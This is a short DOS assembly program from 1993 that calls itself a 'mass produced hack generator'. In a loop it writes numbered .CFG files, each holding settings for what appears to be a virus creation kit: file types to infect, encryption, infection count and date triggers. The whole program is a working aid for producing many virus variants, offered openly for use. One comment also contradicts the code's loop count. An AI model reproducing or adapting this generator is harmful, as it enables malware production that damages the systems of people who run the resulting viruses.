.model  tiny
.code
                org     0100h

begin:          mov     al,3h
                int     10h

message:        mov     dx,offset starttxt      ;print message
                mov     ah,09h
                int     21h

                mov     cx,100d                ;repeat 50 times
do_it:          call    done
done:           pop     bp
                sub     bp,113h
                push    cx
step_1:         mov     dx,offset filename
                xor     cx,cx
                mov     ax,3c02h
                int     21h
                xchg    ax,bx
                mov     ah,40h
                mov     cx,data_02-data_01
                mov     dx,offset here1
                int     21h
                jmp     end_look

end_look:       mov     ah,3eh
                int     21h

                mov     di,offset filename      ;adjust name for next file
                mov     bx,7h                    ; (increment number)
incnum:         inc     byte ptr ds:[bx+di]
                cmp     byte ptr ds:[bx+di],'9'
                jbe     numok
                mov     byte ptr ds:[bx+di],'0'
                dec     bx
                jnz     incnum

numok:          pop     cx                      ;do it again...
                cmp     cx,0
                je      exit
                dec     cx
                push    cx
                jmp     step_1

exit:           int     20h



starttxt        db      'ARiSToTLE MASS PRODUCED HACK GENERATOR.',0Dh, 0Ah
                db      'Copyright (c) - 1993  BLACK AXiS WaReZ.',0Dh, 0Ah, '$'
filename        db      '10000000.CFG',0
data_01:        db      '                 ',0dh, 0ah
Here1:          db      ';ARiSToTLE LiVES SoMEWHERE iN TiME - GR1',0dh,0ah
                db      'Infect = C,E',0Dh, 0Ah
                db      'Traversal = N',0Dh, 0Ah
                db      'Encryption = Y',0Dh, 0Ah
                db      'IDWord = KL',0Dh, 0Ah
                db      'MinSize = 0',0Dh, 0Ah
                db      'MaxSize = A',0Dh, 0Ah
                db      'Infections = 2',0Dh, 0Ah
                db      'ErrorHandler =N',0Dh, 0Ah
                db      'CommandCom = N',0Dh, 0Ah
                db      'AllowZero = Y',0Dh, 0Ah
                db      'Always = N',0Dh, 0Ah
                db      'IfMonth = 6+',0Dh, 0Ah
                db      'IfDay = 9+',0Dh, 0Ah
                db      'IfYear = 1993+   ',0Dh, 0Ah
                db      'Percentage = 80',0Dh, 0Ah
data_02:        db      ';[TaLC-N-JiSM] 93',0dh,0ah
                end    begin







